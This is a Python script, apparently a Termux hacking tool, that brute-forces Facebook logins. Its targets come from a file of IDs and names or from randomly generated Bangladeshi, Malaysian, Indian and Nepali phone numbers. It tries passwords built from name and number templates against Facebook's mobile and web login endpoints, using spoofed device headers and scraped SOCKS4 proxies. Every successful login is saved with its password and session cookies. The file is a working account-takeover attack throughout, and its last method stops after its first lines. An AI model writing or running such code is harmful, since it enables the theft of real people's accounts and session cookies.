import os
import re
import sys
import uuid
import json
import time
import string
import random
from pip._vendor import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

W = '\033[1;97m'
G = '\033[38;5;46m'
R = '\033[38;5;196m'
B = '\x1b[38;5;45m'
Y = "\x1b[38;5;208m"
X = f"{W}[/]"
    
os.system('clear')
print(" [/] Installing Requirements.....")
#━━━━━━━━{━>>/ REQUESTS-MODULE \<<━}━━━━━━━━# 

#-------------------------{HARD CUPTURE + BYPASS SECURITY}------------------------->>>
#-------------------[ SYS ]-------------------#
sys.stdout.write('\x1b]2; ➤➤MR-XD➤➤ \x07')

logo = f"""{W}
     ██████   ██████  ██████  ███    ██ 
     ██   ██ ██    ██ ██   ██ ████   ██ 
     ██████  ██    ██ ██████  ██ ██  ██ 
     ██      ██    ██ ██   ██ ██  ██ ██ 
     ██       ██████  ██   ██ ██   ████ 
{W}------------------------------------------------
 {X} Developer > Abubaker Sheikh 
 {X} Tool Type > File & Random 
 {X} Version   > 0.1
{W}------------------------------------------------"""

try:
    proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()

class RANDOM:
    def __init__(self):
        self.plist = []
        self.oks = []
        self.cps = []
        self.loop = 0
        self.ugen = []
        self.user = []
        self.cok = []
        self.rc = random.choice
        self.rr = random.randint
        self.session = requests.Session()
        self.main()

    def clear(self):
        os.system("clear")
        print(logo)

    def linex(self):
        print(f"{W}------------------------------------------------")

    def main(self):
        self.clear()
        print(f"{W} [1] File Cloning\n [2] Number Cloning\n [3] Contact Admin (fb) \n [0] {R}Exit")
        self.linex()
        x = input(f" {X} Choice > ")
        if x == "1":
            self.file()
        elif x == "2":
            self.rnd()
        elif x == "3":
            os.system("termux-open https://www.facebook.com/XD.ABUBAKER")
        elif x == "0":
            sys.exit()
        else:
            self.main()

    def file(self):
        self.clear()
        file = input(f" {X} Put File Path > ")
        self.linex()
        try:
            with open(file) as f:
                tani = f.read().splitlines()
        except FileNotFoundError:
            print(f" {X}{R} File Location Not Found.")
            time.sleep(1)
            self.file()
            return
        try:
            pasx = int(input(f" {X} Password Limit > "))
        except ValueError:
            pasx = 15
        self.linex()
        for i in range(pasx):
            self.plist.append(input(f" {X} Put Pas {G}{i+1}{W} > "))
        self.linex()
        print(f" {X} Method {G}1{R}>{G}2{R}>{G}3{W}")
        self.linex()
        mtd = input(f" {X} Choice > ")
        self.clear()
        tl = str(len(tani))
        print(f" {X} Total Account > {G}{tl}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
        self.linex()
        with ThreadPoolExecutor(max_workers=30) as executor:
            for user in tani:
                ids, names = user.split('|')
                passlist = self.plist
                if mtd == "1":
                    executor.submit(self.mtdA, ids, names, passlist, tl)
                elif mtd == "2":
                    executor.submit(self.mtdB, ids, names, passlist, tl)
                else:
                    executor.submit(self.mtdC, ids, names, passlist, tl)
        print("")
        self.linex()
        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
        self.linex()
        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
        self.linex()
        sys.exit()

    def mtdA(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M1|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua="[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Nagad;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2239A;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
                data = {
                    'adid': str(uuid.uuid4()),
                    'method': 'POST',
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'family_device_id': str(uuid.uuid4()),
                    'secure_family_device_id': str(uuid.uuid4()),
                    'email': ids, 'password': pas,
                    'cpl': 'true', 'credentials_type': 'password',
                    'generate_session_cookies': '1', 
                    'error_detail_type': 'button_with_disabled',
                    'generate_machine_id': '1',
                    'os_ver': '5.1',
                    'carrier': 'Banglalink',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'omit_response_on_success': 'false',
                    'enroll_misauth': 'false',
                    'advertising_id': str(uuid.uuid4()),
                    'encrypted_msisdn': '',
                    'fb_api_req_friendly_name': 'authenticate'}
                headers = {
                    'host': 'b-graph.facebook.com',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-connection-bandwidth': str(random.randint(20000,50000)),
                    'x-fb-net-hni': str(random.randint(20000,50000)),
                    'x-fb-net-hni': str(random.randint(20000,50000)),
                    'Zero-Rated': '0', 'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'User-Agent':'[FBAN/FB4A;FBAV/34.0.0.3867;FBBV/2353134;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Nagad;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2243A;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]',
                    'content-type': 'app_authlication/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger', 'x-fb-client-IP': 'True',
                    'x-fb-server-cluster': 'Keep-Alive'}
                po = self.session.post("https://api.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/FILE-M1-Ok.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in tst['error']['message']:
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.mtdA(ids,names,passlist,tl)
        except Exception as e:
            pass

    def mtdB(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M2|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua = user_agent()
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "en_US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                po = self.session.post("https://api.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/FILE-M2-Ok.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in tst['error']['message']:
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.mtdB(ids,names,passlist,tl)
        except Exception as e:
            pass

    def mtdC(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M3|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua = tanim()
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "en_US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                po = self.session.post("https://api.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
                    with open('/sdcard/FILE-M3-Ok.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in tst['error']['message']:
                    print(f"\r\r {R}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.mtdC(ids,names,passlist,tl)
        except Exception as e:
            pass

    def rnd(self):
        self.clear()
        print(f" [1] Random Bangladesh \n [2] Random Malaysia \n [3] Random India \n [4] Random Nepal")
        self.linex()
        country = input(f" {X} Select > ")
        self.clear()
        if country == "1":
            print(f" {X} Ex > 0171, 0130, 019*")
        elif country == "2":
            print(f" {X} Ex > 01128, 012**, 011**")
        elif country == "3":
            print(f" {X} Ex > 9848,98**, 63**")
        elif country == "4":
            print(f" {X} Ex > 9814, 99**, 98**")
        else:
            print(f" {X} Select Correct Country :)");time.sleep(2)
        self.linex()
        code = input(f" {X} Put Code > ")
        self.linex()
        print(f" {X} Ex > 1000,9999")
        self.linex()
        try:limit = int(input(f" {X} Put Limit > "))
        except:limit = 99999
        for nmbr in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(7))
            self.user.append(nmp)
        self.linex()
        print(f" [1] Auto Password \n [2] Manual Password")
        self.linex()
        pstype = input(f" {X} Select > ")
        if pstype == "1":
            if country == "1":
                for pasx in ["first6","first7","first8","last11","last6","last7","last8"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "2":
                for pasx in ["first6","first7","first8","last11","last6","last7","last8","Malaysia","malaysia"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "3":
                for pasx in ["first10","first6","first8","first7","last6","last8","57273200","59039200","57575711"]:
                    self.plist.append(pasx)
                self.linex()
            elif country == "4":
                for pasx in ['last7','last6','last8','first10','nepal123','maya123','nepal1234','tamang','magar123','nepal12345','magar1234','magar12345','nepali','tamang123','kathmandu','pokhara','kathmandu123','pokhara123','dinesh','gurung123','sagar123','Kathmandu1234']:
                    self.plist.append(pasx)
                self.linex()
        else:
            self.linex()
            try:pslimit = int(input(f" {X} Password Limit? > "))
            except:pslimit = 8
            self.linex()
            print(f" {X} Ex > first6,last6,first7,etc...")
            self.linex()
            for x in range(pslimit):
                pwx = input(f" {X} Password [{x+1}] > ")
                self.plist.append(pwx)
        self.clear()
        print(f" [1] Method [c_user] \n [2] Method [c_user] \n [3] Method [c_user] \n [4] Method [c_user] \n [5] Method [c_user]")
        self.linex()
        mtd = input(f" {X} Select > ")
        self.linex()
        print(f" [1] Cracking Speed [Normal] \n [2] Cracking Speed [High]")
        self.linex()
        spd = input(f" {X} Select > ")
        if spd == "1":speed = 30
        else:speed = 45
        self.linex()
        print(f" {X} Do You Want to Show Cookie ?)")
        self.linex()
        cki = input(f" {X} Select (Y|N) > ")
        if cki in ["n","N","no","NO"]:self.cok.append("no")
        else:self.cok.append("yes")
        with ThreadPoolExecutor(max_workers=speed) as executor:
            self.clear()
            print(f" {X} Operator  > {code} \n {X} Total Account > {G}{limit}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
            self.linex()
            for love in self.user:
                ids = code+love
                if mtd == "1":
                    executor.submit(self.rA, ids)
                elif mtd == "2":
                    executor.submit(self.rB, ids)
                elif mtd == "4":
                    executor.submit(self.rD, ids)
                elif mtd == "5":
                    executor.submit(self.rE, ids)
                else:
                    executor.submit(self.rC, ids)
        print("")
        self.linex()
        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
        self.linex()
        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
        self.linex()
        sys.exit()

    def pwmanager(self,num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password

    def check_lock(self,uid):
        req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
        if 'Photoshop' in req:
            return True
        else:
            return False

    def generate_jazoest(self,sex):
        jazoest_sum = 0
        for char in sex:
            jazoest_sum += ord(char)
        return f'2{jazoest_sum}'

    def rA(self,ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M1|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    machine_id = str(uuid.uuid4())
                    jazoest = self.generate_jazoest(machine_id)
                    ua = tanim()
                    data={
                    'email': ids,
                    'password': pas,
                    'adid': str(uuid.uuid4()),
                    'device_id': str(uuid.uuid4()),
                    'family_device_id': str(uuid.uuid4()),
                    'advertiser_id': str(uuid.uuid4()),
                    'machine_id': str(uuid.uuid4()),
                    'locale': 'bn_BD',
                    'country_code': 'IN',
                    'client_country_code': 'BM',
                    'cpl': 'true',
                    'source': 'login',
                    'format': 'json',
                    'credentials_type': 'password',
                    'error_detail_type': 'button_with_disabled',
                    'generate_session_cookies': '1',
                    'generate_analytics_claim': '1',
                    'generate_machine_id': '1',
                    'meta_inf_fbmeta': 'NO_FILE',
                    'currently_logged_in_userid': '0',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                    'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'sig': '62f8ce9f74b12f84c123cc23437a4a32',
                    'method': 'auth.login',
                    'logged_out_id': str(uuid.uuid4()),
                    'interface': 'wifi',
                    'reason': 'unknown',
                    'headwind_version': '3',
                    'headwind_cursor': '{}',
                    'community_id': '',
                    'try_num': '1',
                    'enroll_misauth': 'false',
                    'jazoest': jazoest,
                    'sim_country': 'BD',
                    'network_country': 'BD',
                    'flow': 'CONTROLLER_INITIALIZATION'}
                    header={
                    'User-Agent': ua,
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-Tigon-Is-Retry': 'False',
                    'X-FB-Friendly-Name': 'authenticate',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'fb_api_caller_class': 'graphservice',
                    'Priority': 'u=3, i',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True'}
                    url = 'https://b-graph.facebook.com/auth/login'
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[NV] {uid} | {pas} ")
                            else:
                                print('\r\r\033[38;5;46m [PORN-OK] '+ids+' | '+pas)
                                fuck = random.choice(seexy)
                                print(f"\x1b[38;5;46m [\x1b[38;5;46mCOOKIE🍪\x1b[38;5;46m] = {fuck}{coki}")
                                open("/sdcard/PORN-M1-Ok.txt","a").write(uid+"|"+pas+"|"+coki+"\n")                                
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {Y}[LK] {uid} | {pas} ")
                            open("/sdcard/PORN-M1-Lk.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        print('\r\r\033[38;5;196m [PORN-CP] '+ids+' | '+pas)
                        open("/sdcard/PORN-M1-Cp.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rA(ids)
        except Exception as e:
            pass

    def rB(self,ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M2|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    ua = tanim()
                    data={
                    "email": ids,
                    "password": pas,
                    "adid": str(uuid.uuid4()),
                    "device_id": str(uuid.uuid4()),
                    "family_device_id": str(uuid.uuid4()),
                    "session_id": str(uuid.uuid4()),
                    "advertiser_id": str(uuid.uuid4()),
                    "reg_instance": str(uuid.uuid4()),
                    "logged_out_id": str(uuid.uuid4()),
                    "locale": "en_US",
                    "client_country_code": "US",
                    "cpl": "true",
                    "source": "login",
                    "format": "json",
                    "omit_response_on_success": "false",
                    "credentials_type": "password",
                    "error_detail_type": "button_with_disabled",
                    "generate_session_cookies": "1",
                    "generate_analytics_claim": "1",
                    "generate_machine_id": "1",
                    "tier": "regular",
                    "currently_logged_in_userid": "0",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                    "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                    "sig": "62f8ce9f74b12f84c123cc23437a4a32"
                    }
                    header={
                    "User-Agent": ua,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Bandwidth": str(random.randint(2000000, 30000000)),
                    "X-FB-Connection-Quality": "EXCELLENT",
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Friendly-Name": "authenticate",
                    "Content-Type": "application/x-www-form-urlencoded"
                    }
                    url = "https://graph.facebook.com/auth/login"
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                            else:
                                print('\r\r\033[38;5;46m [PORN-OK] '+ids+' | '+pas)
                                fuck = random.choice(seexy)
                                print(f"\x1b[38;5;46m [\x1b[38;5;46mCOOKIE🍪\x1b[38;5;46m] = {fuck}{coki}")
                                open("/sdcard/PORN-M2-Ok.txt","a").write(uid+"|"+pas+"|"+coki+"\n")                              
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {Y}[LK] {uid} | {pas} ")
                            open("/sdcard/PORN-M2-Lk.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error']['message']:
                        print('\r\r\033[38;5;196m [PORN-CP] '+ids+' | '+pas)
                        open("/sdcard/PORN-M2-Cp.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rB(ids)
        except Exception as e:
            pass

    def rC(self,ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M3|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids,pw)
                    ua = user_agent()
                    data={
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'fb_api_req_friendly_name': 'authenticate'}
                    header={
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}
                    url = "https://api.facebook.com/method/auth.login"
                    po = session.post(url,data=data,headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid=str(q['uid'])
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                            else:
                                print(f"\r\r {G}[OK] {uid} | {pas} \n {W}->>{G} {coki}")
                            open("/sdcard/RANDOM-M3-Ok.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {Y}[LK] {uid} | {pas} ")
                            open("/sdcard/RANDOM-M3-Lk.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif 'www.facebook.com' in q['error_msg']:
                        open("/sdcard/RANDOM-M3-Cp.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rC(ids)
        except Exception as e:
            pass

   
    def rD(self,ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M4|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as ses:
                    pas = self.pwmanager(ids,pw)
                    usera = requests.get('https'+':'+'//'+'gist'+'.'+'github'+'user'+'content'+'.'+'com'+'/'+'pzb'+'/'+'b4b6f57'+'144aea'+'7827ae4'+'/'+'raw'+'/'+'cf847b76a142955b1'+'410c8b'+'c'+'e'+'f'+'3'+'aabe221a63db1'+'/'+'user'+'-'+'agents'+'.'+'txt').text.splitlines()
                    ua = random.choice(usera)
                    nip=random.choice(proxsi)
                    proxs= {'http': 'socks4://'+nip}
                    p = ses.get("https://m.facebook.com/login.php/")
                    m_ts_match = re.search('name="m_ts" value="(.*?)"', p.text)
                    m_ts = m_ts_match.group(1)
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                    __data__ ={'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),'display': '','isprivate': '','return_session': '','skip_api_login': '','signed_next': '','trynum': '1','timezone': '-360','lgndim': 'eyJ3Ijo0MzIsImgiOjk2MCwiYXciOjQzMiwiYWgiOjk2MCwiYyI6MjR9','lgnrnd': '231654_hyP4','lgnjs': '1718518614','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','ab_test_data': '%2FAAAAAAAAAAAAAAAAAAVAAAAAAAAAAVVAAAAAVAAA%2F%2FAA%2FAAAADAAB','encpass': f"#PWD_BROWSER:0:{m_ts}:{pas}"}
                    __head__ = {'user-agent': ua,'Accept-Encoding': 'gzip, deflate','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Connection': 'keep-alive','authority': 'en-gb.facebook.com','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://en-gb.facebook.com','referer': 'https://en-gb.facebook.com/login.php/','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','Content-Length': '507'}
                    po = ses.post('https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=__data__,cookies={'cookie': kuki},headers=__head__,allow_redirects=False,proxies=proxs)
                    if "c_user" in ses.cookies.get_dict().keys():
                        coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                        uid = re.findall('c_user=(.*);xs', coki)[0]
                        if self.check_lock(uid) == True:
                            if "no" in self.cok:
                                print(f"\r\r {G}[OK] {uid} | {pas} ")
                                self.cek_apk(ses,coki)
                            else:
                                print(f"\r\r {G}[OK] {uid} | {pas} \n {W}->>{G} {coki}")
                                self.cek_apk(ses,coki)
                            open("/sdcard/RANDOM-M4-Ok.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                            break
                        elif self.check_lock(uid) == False:
                            print(f"\r\r {Y}[LK] {uid} | {pas} ")
                            open("/sdcard/RANDOM-M4-Lk.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                            break
                    elif "checkpoint" in po.cookies.get_dict().keys():
                        open("/sdcard/RANDOM-M4-Cp.txt","a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.rD(ids)
        except Exception as e:
            pass

    def rE(self,ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M5|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
        sys.stdout.flush()
